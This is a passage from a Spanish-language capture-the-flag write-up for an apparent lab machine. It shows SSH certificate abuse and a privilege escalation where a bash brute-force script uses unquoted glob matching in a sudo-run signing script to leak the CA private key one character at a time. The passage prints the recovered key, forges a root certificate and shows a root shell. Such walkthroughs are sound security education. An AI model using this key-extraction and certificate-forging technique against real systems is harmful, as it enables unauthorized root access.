ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgQ8Sit3OTFBWgzxB1Tb15sEcJd5phxFb7utL/mqY3xbYAAAADAQABAAABgQChF6mmqr3WE3aHoYIt3mpXAAo7w2qHWyRhcf0zHRUIwupqy3gRmZg0TeO3xr5YDkr2WPuCjHMmqb3iMl9hteC+mYyEUrrs9tgMYUIqWB/Qn9TIM3JKo3XUUojcxMw8PgKiIIsTbb7r0ysZ//D+yN/nWprlLGlsaRHVrvka8CWv08bT14NjFoyAXT2DKG+8DmoSqt6qDjQI/QpXm1LDadTqDKcBaTOcdHityt17u+T01LDEUM8fsIjTJ81U3oECXnGwVhXPFVokxpZsRL/qkp9mx6uvG+W2h5CI309kxCUSZVcDnRBg9iOSPjb9PxU74O7UtighO1RHCyxYsB5OvKAw0ExOOW4W89yMKEWfPDKEFbkI9nJO1NNgAyDR5olERSkS8T+pKwJeylHgWAs09KgjuPHW+DJkJHATWqjHPDzQLfrBC1KoZ0CSZOSzqEJ433epdKaFsBgqrqNMXhaYBBaXlez75vDLcmQvfV+7mx6Ae8zHlhQLnwEltm9/IZMcgUcAAAAAAAAALQAAAAEAAAAHenppbnRlcgAAABAAAAAMenppbnRlcl90ZW1wAAAAAGbXa6v//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEALVuSlkKcxCvNUolV8RTMGb3RotMsvZM/wOzluf8pFR8VO99jaG+2d9Emq79iVRWrFS/6mUiBGPUrBKL62RqgE pointedsec@parrot
```
Da igual que como parámetro a nivel de comando hayamos especificado `support` ya que el comando por detrás se realiza con el principal hardcodeado.

Ahora si comprobamos esta clave vemos que efectivamente, tiene el principal de `zzinter_temp`
```console
$ ssh-keygen -Lf test2 
test2:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:blvDbjxySkHARnbWjYq0m/wTl7qABo/8ZCMu4B+JiO0
        Signing CA: ED25519 SHA256:1p3yJYtPaG3wNIzooDpnzx5dFkAgHdnFVNDt7HbRpKc (using ssh-ed25519)
        Key ID: "zzinter"
        Serial: 44
        Valid: after 2024-09-03T22:00:55
        Principals: 
                zzinter_temp
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc

```

Por lo cual ahora podemos iniciar sesión en la máquina víctima como `zzinter`
```console
$ ssh -o CertificateFile=test2 -i pointed zzinter@ssg.htb -p 2222
Enter passphrase for key 'pointed': 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Sep 10 08:05:13 PM UTC 2024

  System load:           0.0
  Usage of /:            80.5% of 10.73GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             236
  Users logged in:       0
  IPv4 address for eth0: 10.129.197.255
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c869


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 10 20:01:12 2024 from 10.10.14.143
zzinter@ssg:~$ id
uid=1001(zzinter) gid=1001(zzinter) groups=1001(zzinter)
```

Si intentamos hacer lo mismo para el principal de `root`
```console
$ ./sign.sh pointed.pub zzinter support
{"detail":"Root access must be granted manually. See the IT admin staff."}
```
Esto si que está limitado por la API.

# Privilege Escalation 
Ahora podemos ejecutar como `root` el script que habíamos encontrado antes en `/opt`
```console
zzinter@ssg:/opt$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
```

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal_str="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"

```

ChatGPT nos explica el script.

Este script Bash realiza la firma de una clave pública SSH utilizando un archivo de autoridad de certificación (CA) para generar un certificado SSH. También verifica ciertos parámetros antes de proceder con la firma. A continuación se desglosa su funcionamiento paso a paso:

### 1. **Uso y validación de argumentos**:

- El script espera **cinco argumentos**:
    1. `ca_file`: archivo que contiene la clave privada de la autoridad de certificación (CA).
    2. `public_key_file`: archivo de clave pública que se va a firmar.
    3. `username`: nombre de usuario para identificar la clave.
    4. `principal`: lista de principales o roles asociados.
    5. `serial`: número de serie del certificado.
- Si no se proporcionan exactamente cinco argumentos, se muestra un mensaje de uso correcto del script y termina.

### 2. **Verificación de archivos**:

- **Verifica si el archivo CA existe**: Si el archivo `ca_file` no existe, muestra un error y termina.
- **Lee el contenido del archivo CA**: Compara el contenido del archivo de CA proporcionado con el archivo `/etc/ssh/ca-it`. Si son iguales, muestra un error indicando que esta CA debe usarse a través de una API y finaliza el script.

### 3. **Verificación de clave pública**:

- Comprueba que el archivo de clave pública proporcionado exista. Si no existe, muestra un error y termina.

### 4. **Validación de principales**:

- Define un conjunto de principales válidos: `webserver`, `analytics`, `support`, `security`.
- Convierte el argumento `principal_str` en un array, dividiendo la cadena por comas.
- Verifica que cada principal proporcionado esté en la lista de principales válidos. Si algún principal no es válido, muestra un error con la lista de principales permitidos y termina.

### 5. **Verificación del número de serie**:

- Comprueba si el argumento `serial` es un número entero positivo. Si no lo es, muestra un error y termina.

### 6. **Firma de la clave pública**:

- Utiliza `ssh-keygen` para firmar la clave pública con el archivo de CA proporcionado. Los parámetros que usa son:
    - `-s "$ca_file"`: especifica el archivo CA para firmar.
    - `-z "$serial"`: asigna el número de serie al certificado.
    - `-I "$username"`: asigna el identificador del certificado (el nombre del usuario).
    - `-V -1w:forever`: hace que el certificado sea válido desde una semana antes (`-1w`) hasta para siempre (`forever`).
    - `-n "$principal"`: asigna los principales al certificado.
    - Finalmente, el archivo de clave pública se pasa como argumento para ser firmado.

### Resumen:

Este script firma una clave pública SSH utilizando una clave privada de autoridad de certificación (CA). Verifica que los principales sean válidos, que el archivo CA no sea uno reservado para un proceso de firma basado en API y que el número de serie sea un número válido. Si todas las validaciones son correctas, genera un certificado SSH firmado con la clave pública y lo asocia con un conjunto de principales y un número de serie.

Ahora vamos a ponernos en situación.
El problema de este script viene en la comparación.
```bash
itca=$(cat /etc/ssh/ca-it)                                                                
ca=$(cat "$ca_file")                                                                      
if [[ $itca == $ca ]]; then                                                               
    echo "Error: Use API for signing with this CA."                                       
    usage                                                                                 
fi 
```

Ya que carga los contenidos podemos hacer uso de globbing para explotar el script y conseguir la clave de la CA original. Esto significaría que al tener la clave de la CA podemos firmar nosotros mismos una clave pública con el principal de `root` y escalar privilegios.
### Concepto de Globbing en Bash

El **globbing** es una característica en Bash que expande los patrones de archivo (como `*` y `?`) a nombres de archivo que coinciden con esos patrones. Si el script usa globbing de manera insegura, puedes aprovecharlo para exponer el contenido del archivo en partes.

Con un ejemplo se verá mejor.
Podemos usar el script para firmar correctamente una clave pública con nuestra clave privada.
```console
zzinter@ssg:~$ sudo /opt/sign_key.sh ca-itrc pointed.pub root support 2
Signed user key pointed-cert.pub: id "root" serial 2 for support valid after 2024-09-03T20:24:46
```

Esto significa que nuestra clave privada no es la misma que la del servidor del cual queremos su clave, esto es obvio.

Ahora podemos crear un archivo `test` con contenido `test` y lanzar el script con este archivo como clave privada.
```console
zzinter@ssg:~$ cat test 
test
```

Como no se verifica que la clave sea válida, va a llegar a la comparación, la va a pasar porque `test` no es lo mismo al contenido de la CA que queremos obtener y dará un error al intentar firmar la clave porque no es una clave privada válida.
```console
zzinter@ssg:~$ sudo /opt/sign_key.sh test pointed.pub root support 2
Load key "test": error in libcrypto
```

Pero y si el contenido de `test` fuera `-*`
```console
zzinter@ssg:~$ cat test 
-*
```

Esto significaría que el script compara `-*` que se resuelve en lo que sea que empiece por el carácter `-` con la clave privada que empieza por una cabecera `-----BEGIN OPENSSH PRIVATE KEY-----`, por lo cual la comparación sería válida y podríamos afirmar que la clave privada de la CA empieza por `-`
```console
zzinter@ssg:~$ sudo /opt/sign_key.sh test pointed.pub root support 2
Error: Use API for signing with this CA.
Usage: /opt/sign_key.sh <ca_file> <public_key_file> <username> <principal> <serial>
```

Y efectivamente, esto funciona.
Por lo cual podemos hacer un script que vaya iterando por todos los caracteres mayúsculas, minúsculas, numéricos y caracteres especiales para ir descubriendo la clave de la CA carácter por carácter.

Este el el script.
```bash
#!/bin/bash

# Lista de caracteres válidos (incluyendo los que forman las claves privadas y un espacio para saltos de línea)
characters='-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+=/ ?'
found_key=""

# Crear o vaciar el archivo pwn
> pwn

# Función para probar combinaciones de caracteres
test_combination() {
    local prefix="$1"
    local suffix="$2"

    # Iterar sobre cada carácter en la lista
    for (( i=0; i<${#characters}; i++ )); do
        char="${characters:$i:1}"

        # Reemplazar el espacio por un salto de línea en caso de ser necesario
        if [ "$char" = "?" ]; then
            char=$'\n'
        fi

        # Crear la combinación de caracteres
        echo -n "$prefix$char$suffix*" > pwn

        # Ejecutar el comando con el archivo pwn
        sudo /opt/sign_key.sh pwn pointed.pub root support 2 > /dev/null 2>&1

        # Verificar el resultado del comando
        if [ $? -eq 1 ]; then
            echo "Encontrado carácter: $found_key$char"
            found_key="$found_key$char"
            # Llamar a la función de nuevo para continuar con el siguiente carácter
            test_combination "$prefix$char" ""
            return
        fi
    done
}

# Iniciar el proceso con combinaciones de un solo carácter
test_combination "" "*"

# Limpiar el archivo pwn
rm pwn

echo "Clave privada descubierta: "
echo "$found_key"
```

Y si lo ejecutamos y lo dejamos un rato conseguimos la clave privada de la CA.
```console
zzinter@ssg:~$ ./brute.sh
.............
Clave privada descubierta: 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

Ahora recordemos que el principal de `root` es `root_user`
```console
zzinter@ssg:~$ cat /etc/ssh/auth_principals/root 
root_user
```

Ahora podemos firmar nuestra clave pública con la clave de la CA que hemos dumpeado.
```console
$ ssh-keygen -s cakey -n root_user -I root_user pointed.pub 
Signed user key pointed-cert.pub: id "root_user" serial 0 for root_user valid forever
```

Y vemos que tiene el principal que queremos.
```console
$ ssh-keygen -Lf pointed-cert.pub 
pointed-cert.pub:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:blvDbjxySkHARnbWjYq0m/wTl7qABo/8ZCMu4B+JiO0
        Signing CA: ED25519 SHA256:1p3yJYtPaG3wNIzooDpnzx5dFkAgHdnFVNDt7HbRpKc (using ssh-ed25519)
        Key ID: "root_user"
        Serial: 0
        Valid: forever
        Principals: 
                root_user
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
```

Y ya podemos acceder a la máquina víctima como el usuario `root`
```console
$ ssh -o CertificateFile=pointed-cert.pub -i pointed root@ssg.htb -p 2222
Enter passphrase for key 'pointed': 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Sep 10 09:26:54 PM UTC 2024

  System load:           0.08
  Usage of /:            90.0% of 10.73GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             243
  Users logged in:       1
  IPv4 address for eth0: 10.129.197.255
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c869

  => / is using 90.0% of 10.73GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@ssg:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Y leer la flag.
```console
root@ssg:~# cat root.txt 
2b0a8753495825a9e...
```

Happy Hacking! 🚀